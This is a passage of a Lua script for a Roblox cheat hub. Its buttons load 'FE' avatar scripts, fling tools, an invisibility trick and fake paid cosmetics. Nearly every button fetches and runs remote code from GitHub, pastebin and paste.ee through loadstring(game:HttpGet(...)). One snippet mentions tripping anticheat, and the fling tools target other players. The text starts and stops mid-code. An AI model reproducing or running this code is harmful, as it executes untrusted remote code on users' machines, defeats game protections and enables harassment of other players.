    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/fes/main/soccerball"))();
  	end    
})


FeScriptTab:AddButton({
	Name = "Titan Fling [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/FLLRSBG1",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/FLLRSBG1'))    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/TitanFling/main/op"))();
  	end    
})


FeScriptTab:AddButton({
	Name = "Fake VR [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Successfully loaded!",
	Content = "No hats required, your script has loaded.",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/fefake/main/vr"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Hat Orbit [R6 & R15]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Commands:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/jwAckWQ5",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/jwAckWQ5')) 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/hatspin/main/cool"))()
  	end    
})


----------------------------------------------------------------------------------
-- New section --
-- FE Paid Hats--
----------------------------------------------------------------------------------
local Section = FeScriptTab:AddSection({
	Name = "FE Paid Hats"
})


FeScriptTab:AddButton({
	Name = "Demon [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/4YzZwE6C",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/4YzZwE6C'))	    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/demonscript/main/source"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "WideBoy [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hat:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/5074143464/Blue-Energy-Wings",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://www.roblox.com/catalog/5074143464/Blue-Energy-Wings'))
    loadstring(game:HttpGet('https://paste.ee/r/FYx2k', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Tank V2 [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/EjNBRXGR",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/EjNBRXGR'))
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/fetankv2/main/source"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Block Car [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/tdch8JYU",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/tdch8JYU'))    
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/FEBlockcar/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Among Us V3 [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/3EJZEwhW",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/3EJZEwhW'))     
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/amongusv3/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Hammer Arm [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/3fiV0N5s",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/3fiV0N5s'))   
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/hammerarm/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Flying Gunner [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/LjY7qZSq",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/LjY7qZSq')) 
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/flyinggunner/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Block Hammer [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://controlc.com/1becc5a1",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://controlc.com/1becc5a1')) 
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/Blockhammer/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Red Samurai [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hat:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/B8F9HtwE",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/B8F9HtwE'))
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/kakabok1233453/asdasda/main/Red%20Samurai'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Minecart [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hat:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/k7VcbXBi",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/k7VcbXBi'))    
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/kakabok1233453/asdasda/main/Minecart'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Snake [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/Zqx7gxvJ",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/Zqx7gxvJ'))   
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/fesnake/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Road Rogue [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/Leh4NSzr",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/Leh4NSzr')) 	    
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/roadrogue/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Propeller [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/BWhBkH54",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/BWhBkH54'))	    
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/propellerman/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Cop [R6 Only]",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/JySNEdjA",
	Image = "rbxassetid://4483345998",
	Time = 5
})

	setclipboard(tostring('https://pastebin.com/raw/JySNEdjA'))    
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/fecop/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Achromatic Glitcher [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/8hNKnjq1",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/8hNKnjq1'))
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/feglitcher/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Void Boss [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/4zNuAnzL",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/4zNuAnzL'))
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/voidboss/main/source', true))()	
  	end    
})


FeScriptTab:AddButton({
	Name = "Popcat [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/V6r6YR5q",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://pastebin.com/raw/V6r6YR5q'))	    
    --[[
Made By Ice & Fire
Discord: Ice & Fire#0001
Roblox: 09Ice_Fire09

The Pop Cat!

Controls:
e= sit, q= pop
r= wave
t= punch
f= idk
g= punch from black
z= yes
x= no

Hats:
https://www.roblox.com/catalog/6380246734/Pop-Cat
https://www.roblox.com/catalog/6065706256/Pop-Cat-Hoodie
https://www.roblox.com/catalog/8337370/Blockhead-Baseball-Cap
https://www.roblox.com/catalog/48474313/Red-Roblox-Cap
https://www.roblox.com/catalog/48474294/ROBLOX-Girl-Hair
https://www.roblox.com/catalog/62724852/Chestnut-Bun
https://www.roblox.com/catalog/451220849/Lavender-Updo
https://www.roblox.com/catalog/62234425/Brown-Hair
Cost: 133 Bobux

Made By Ice & Fire
Discord: Ice & Fire#0001
Roblox: 09Ice_Fire09
]]

loadstring(game:HttpGet(('https://raw.githubusercontent.com/hacker123454/x/main/Pop_Cat.txt'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Jeep [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hat:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/9666085843/DESERT-BEEP",
	Image = "rbxassetid://4483345998",
	Time = 5
})
    setclipboard(tostring('https://www.roblox.com/catalog/9666085843/DESERT-BEEP'))	
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/jeepdarkeccentric/main/source'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Baseball Bat [R6 Only]",
	Callback = function()
	   OrionLib:MakeNotification({
	Name = "Necessary hat:",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/7063113820/Aluminium-Baseball-Bat",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://www.roblox.com/catalog/7063113820/Aluminium-Baseball-Bat'))
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/baseballbatfe/main/source'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Winged Gunner [R6 Only]",
	Callback = function()
	   OrionLib:MakeNotification({
	Name = "Necessary hat:",
	Content = "Link copied to clipboard, https://raw.githubusercontent.com/KRNL2/hatsforwingedgunner/main/hats",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://raw.githubusercontent.com/KRNL2/hatsforwingedgunner/main/hats'))
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/wingedgunner/main/source'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Walking Cube V2 [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Walking Cube V2",
	Content = "Link copied to clipboard, https://www.roblox.com/catalog/5461538290/Sandwich-Costume",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://www.roblox.com/catalog/5461538290/Sandwich-Costume'))    
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/FEWalkingCubeV2/main/source'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Shotgun [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://raw.githubusercontent.com/KRNL2/feshotgunhats/main/hats",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://raw.githubusercontent.com/KRNL2/feshotgunhats/main/hats'))        
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/feshotgun/main/source'),true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Sheep [R6 Only]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Necessary hats:",
	Content = "Link copied to clipboard, https://pastebin.com/raw/j9B201MY",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://pastebin.com/raw/j9B201MY'))   
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/KRNL2/fesheep/main/source'),true))()
  	end    
})


----------------------------------------------------------------------------------
-- New Section --
-- FE No Hats -- 
----------------------------------------------------------------------------------
local Section = FeScriptTab:AddSection({
	Name = "FE No Hats"
})


FeScriptTab:AddButton({
	Name = "Small Avatar V2 [R15 Only] [Scale]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Scale:",
	Content = "Link copied to clipboard, https://raw.githubusercontent.com/KRNL2/smallavatarscale/main/source",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://raw.githubusercontent.com/KRNL2/smallavatarscale/main/source')) 
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/smallavatarv2/main/source', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Titan [R15 Only] [Scale]",
	Callback = function()
	    OrionLib:MakeNotification({
	Name = "Scale:",
	Content = "Link copied to clipboard, https://github.com/KRNL2/bodytype/blob/main/titan",
	Image = "rbxassetid://4483345998",
	Time = 5
})
	setclipboard(tostring('https://github.com/KRNL2/bodytype/blob/main/titan'))    
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/fesizechanger/main/titan', true))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Winged Human [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/fewinged/main/human"))()	
  	end    
})


FeScriptTab:AddButton({
	Name = "Dog [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL2/fedog/main/animation"))();
  	end    
})


FeScriptTab:AddButton({
	Name = "Huge Leg [R15 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Ragdoll Death [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/ragdolldeath/main/source'))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Walk on Walls [R6 & R15]",
	Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Invisibility [R15 Only]",
	Callback = function()
    local removeNametags = false -- remove custom billboardgui nametags from hrp, could trigger anticheat

local plr = game:GetService("Players").LocalPlayer
local character = plr.Character
local hrp = character.HumanoidRootPart
local old = hrp.CFrame

if not character:FindFirstChild("LowerTorso") or character.PrimaryPart ~= hrp then
return print("unsupported")
end

if removeNametags then
local tag = hrp:FindFirstChildOfClass("BillboardGui")
if tag then tag:Destroy() end

hrp.ChildAdded:Connect(function(item)
if item:IsA("BillboardGui") then
task.wait()
item:Destroy()
end
end)
end

local newroot = character.LowerTorso.Root:Clone()
hrp.Parent = workspace
character.PrimaryPart = hrp
character:MoveTo(Vector3.new(old.X,9e9,old.Z))
hrp.Parent = character
task.wait(0.5)
newroot.Parent = hrp
hrp.CFrame = old
  	end    
})


FeScriptTab:AddButton({
	Name = "Mouse Fling [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/mousefling/main/source'))()
  	end    
})


FeScriptTab:AddButton({
	Name = "Creepy Crawler [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/-FeCreepyCrawler/main/anice'))()
  	end    
})


--[] Kryptos | Character
local Section = CharacterTab:AddSection({
	Name = "Character Customization"
})


CharacterTab:AddButton({
	Name = "Headless [R15 & R6]",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Headless", true))()
  	end    
})


CharacterTab:AddButton({
	Name = "Korblox Right Leg [R15 ONLY]",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Right%20Leg", true))()
  	end    
})


CharacterTab:AddButton({
	Name = "Korblox Left Leg [R15 ONLY]",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Left%20leg", true))()
  	end    
})


local Section = CharacterTab:AddSection({
	Name = "Faces"
})


CharacterTab:AddButton({
	Name = "Red Beast Mode [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://129003756" 		
  	end    
})


CharacterTab:AddButton({
	Name = "Playful Vampire [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://6779437898" 		
  	end    
})


CharacterTab:AddButton({
	Name = "Super Super Happy Face [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://6779442089"
  	end    
})


CharacterTab:AddButton({
	Name = "Yum! [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://6779401729"
  	end    
})



CharacterTab:AddButton({
	Name = "Red Glowing Eyes [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://6779462397"
  	end    
})


CharacterTab:AddButton({
	Name = "Prankster [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://20052028"
  	end    
})


CharacterTab:AddButton({
	Name = "ROBLOX Madness [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://479872791"
  	end    
})


CharacterTab:AddButton({
	Name = "The Dog Whisper [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://34764373"
  	end    
})


CharacterTab:AddButton({
	Name = "Evil Skeptic [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://110287983"
  	end    
})


CharacterTab:AddButton({
	Name = "Red Tango [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://629930519"
  	end    
})


CharacterTab:AddButton({
	Name = "Angelic [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://45083898"
  	end    
})


CharacterTab:AddButton({
	Name = "Green Glowing Eyes [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://398676207"
  	end    
})


CharacterTab:AddButton({
	Name = "Troublemaker [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://22920500"
  	end    
})


CharacterTab:AddButton({
	Name = "Paintball Enthusiast [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://23310996"
  	end    
})


CharacterTab:AddButton({
	Name = "Grandma's Lipstick [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://51241479"
  	end    
})


CharacterTab:AddButton({
	Name = "Facepalm [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://30394593"
  	end    
})


CharacterTab:AddButton({
	Name = "Country Morning [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://51241521"
  	end    
})


CharacterTab:AddButton({
	Name = "Optimist [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://21024598"
  	end    
})


CharacterTab:AddButton({
	Name = "Camoface [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://24441824"
  	end    
})


CharacterTab:AddButton({
	Name = "Bandage [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://20418584"
  	end    
})


CharacterTab:AddButton({
	Name = "Silver Punk Face [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://387256104"
  	end    
})


CharacterTab:AddButton({
	Name = "Green Whatchoo Talkin' Bout [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://629936597"
  	end    
})


CharacterTab:AddButton({
	Name = "Red RAWR [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://66329788"
  	end    
})


CharacterTab:AddButton({
	Name = "Blizzard Beast Mode [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://209712379"
  	end    
})


CharacterTab:AddButton({
	Name = "Tattletale [R15 & R6]",
	Callback = function()
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.Head.face.Texture = "rbxassetid://26343132"
  	end    
})

local Section = CharacterTab:AddSection({
	Name = "Valkyrie"
})

CharacterTab:AddButton({
	Name = "Black Valkyrie [R15 & R6]",
	Callback = function()
        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(c, d, b, _, a, e)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = b
            f.Part1 = _
            f.C0 = a
            f.C1 = e
            f.Parent = d
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, e)
            e.Parent = _
            local d = e:FindFirstChild("Handle")
            if d then
                local c = d:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = a(_, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = e.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 124730194
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
        end
})


CharacterTab:AddButton({
	Name = "Emerald Valkyrie [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, a, c, b, d, e)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = c
            f.Part1 = b
            f.C0 = d
            f.C1 = e
            f.Parent = a
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(c, e)
            e.Parent = c
            local d = e:FindFirstChild("Handle")
            if d then
                local a = d:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = b(c, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = c:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = e.AttachmentPoint
                        _("HeadWeld", c, c, d, a, b)
                    end
                end
            end
        end
        local _ = 2830437685
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Violet Valkyrie [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(e, d, c, a, b, _)
            local f = Instance.new("Weld")
            f.Name = e
            f.Part0 = c
            f.Part1 = a
            f.C0 = b
            f.C1 = _
            f.Parent = d
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, e)
            e.Parent = _
            local d = e:FindFirstChild("Handle")
            if d then
                local c = d:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = a(_, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = e.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1402432199
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Valiant Valkyrie of Testing [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(_, b, a, d, e, c)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = a
            f.Part1 = d
            f.C0 = e
            f.C1 = c
            f.Parent = b
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, d)
            d.Parent = _
            local e = d:FindFirstChild("Handle")
            if e then
                local a = e:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(_, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = d.AttachmentPoint
                        b("HeadWeld", c, c, e, _, a)
                    end
                end
            end
        end
        local _ = 7781687598
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Valkyrie Helm [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(c, b, _, a, d, e)
            local f = Instance.new("Weld")
            f.Name = c
            f.Part0 = _
            f.Part1 = a
            f.C0 = d
            f.C1 = e
            f.Parent = b
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, d)
            d.Parent = _
            local e = d:FindFirstChild("Handle")
            if e then
                local c = e:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = a(_, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = d.AttachmentPoint
                        b("HeadWeld", c, c, e, a, _)
                    end
                end
            end
        end
        local _ = 1365767
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


CharacterTab:AddButton({
	Name = "Sparkle Time Valkyrie [R15 & R6]",
	Callback = function()
            function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(e, d, b, c, a, _)
            local f = Instance.new("Weld")
            f.Name = e
            f.Part0 = b
            f.Part1 = c
            f.C0 = a
            f.C1 = _
            f.Parent = d
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, e)
            e.Parent = _
            local d = e:FindFirstChild("Handle")
            if d then
                local a = d:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(_, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
